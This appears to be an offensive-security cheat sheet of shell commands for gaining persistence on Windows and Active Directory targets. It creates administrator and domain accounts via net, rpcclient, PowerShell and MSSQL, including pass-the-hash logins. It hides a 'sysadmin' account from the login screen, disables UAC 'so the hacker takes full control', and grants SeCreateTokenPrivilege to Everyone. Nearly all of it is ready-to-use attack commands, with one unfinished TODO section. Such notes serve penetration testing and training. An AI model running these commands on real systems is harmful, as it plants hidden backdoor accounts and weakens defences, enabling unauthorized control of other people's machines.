# Unix Shell

## 01 - `net`

Create user

```
$ net <ads | rpc> user add "sysadmin" "s3cur3d+1T" [-F user flags] [-C comment] -U "[<domain>/]<username>%<password>" -S <IP>

$ net <ads | rpc> user add "sysadmin" "s3cur3d+1T" -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

Create group

```
$ net <ads | rpc> groupmember add <group_name> <remote_username> -U "[<domain>/]<username>%<password>" -S <IP>

$ net <ads | rpc> groupmember add <group_name> <remote_username> -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

Makes the user account invisible from the Windows Login screen

```
$ reg.py

C:\> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v sysadmin /t REG_DWORD /d 0 /f
```

Persistence method to add user account

```
$ reg.py

C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v MS_BACKUP /t REG_DWORD /d 0 /f
```

Disabling UAC that allows the hacker to take full control

```
$ reg.py

C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```

Enabling UAC to make the admin restrictive

```
$ reg.py

C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
```

## 02 - `rpcclient`

- Create domain user account

```
rpcclient $> createdomuser <username>

rpcclient $> setuserinfo2 <username> <level> <password>

rpcclient $> setuserinfo2 <username> 23 <password>

rpcclient $> setuserinfo2 <username> 24 <password>
```

```
rpcclient $> enumdomusers
```

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN

- LSA create account

```
rpcclient $> lsaenumsid

rpcclient $> lookupsids S-1-1-0
```

Lookup username accounts

```
rpcclient $> lookupnames <username>

rpcclient $> lsacreateaccount S-1-1-0

rpcclient $> lsaaddpriv S-1-1-0 SeCreateTokenPrivilege

rpcclient $> lsaenumprivsaccount S-1-1-0
```

## 02 - Powershell

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
New-LocalUser -Name sysadmin -Password $password
Add-LocalGroupMember -Groups Administrators -Member "sysadmin"
```

## 03 - MSSQL

TODO: Fill this info

### 3.2 - SQLCMD

```
C:\> sqlcmd [-S <IP>] -E -Q

CREATE LOGIN <username> WITH PASSWORD = '<password>';
sp_addsrvrolemember '<username>', 'sysadmin';
go
```

### 3.3 - Impacket

```
$ mssqlclient.py -port 1433 -windows-auth <domain>/<username>:<password>@<IP>

$ mssqlclient.py -port 1433 -windows-auth <domain>/<username>@<IP> -hashes :<nt_hash>
```

### 3.4 - NetExec

```
$ netexec mssql -u "<username>" -p "<password>" [-d <domain> | --local-auth]

$ netexec mssql -u "<username>" -H "<nt_hash>" [-d <domain> | --local-auth]
```